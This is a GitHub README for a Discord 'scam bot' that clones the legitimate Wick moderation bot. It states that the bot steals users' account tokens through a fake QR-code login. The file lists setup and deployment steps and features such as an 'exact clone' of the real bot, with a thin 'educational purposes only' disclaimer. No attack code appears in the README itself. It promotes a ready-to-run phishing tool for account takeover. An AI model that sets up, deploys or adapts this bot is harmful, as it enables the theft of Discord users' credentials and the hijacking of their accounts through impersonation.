<h1 align="center"><a>Wick Scam Bot ⛔</a></h1>
<h3 align="center">Wick Discord scam bot that steals your token via a QR Code.</h3>
<h3 align="center">This project is for Educational Purposes ONLY. This was not meant for malicous use. </br>
When using this Discord Bot, you hold responsibility for any consequences that you occur.</h3>

### Features
* **Exact Clone** (Looks exactly like the real wick bot)
* **Modular Design** (add commands and events exactly like a real bot)
</br>

![image](https://user-images.githubusercontent.com/93608862/178123406-119f5f84-f2bd-4b97-8bd9-168a68be3921.png)

### Setup
* **Clone Repository** `gh repo clone ulnk/social`
* **Install Dependencies** `yarn install` or `npm install`
* **ENABLE ALL PARTIALS AND INTENTS FOR YOUR BOT** 
  * Without all partials and intents, the bot will not function.
* **Edit `config.json` file**
  * Change the all of the config.json options to your bot .
  * *(NOTE: KEEP ALL CHANNELS INSIDE THE SAME GUILD)*
* **Add all emojis to server**
  * Without, the emojis will be `undefined`
* **Start** `yarn dev` or `npm run dev`
  * if using heroku, make sure you have the start script

### Libraries Used
* **discord.js** (discord bot) <img alt="preview badge" src="https://img.shields.io/npm/v/discord.js">
* **crypto** (private keys & public keys) <img alt="preview badge" src="https://img.shields.io/npm/v/crypto">
* **ws** (web socket) <img alt="preview badge" src="https://img.shields.io/npm/v/ws">
* **jimp** (image editing for qr code) <img alt="preview badge" src="https://img.shields.io/npm/v/jimp">
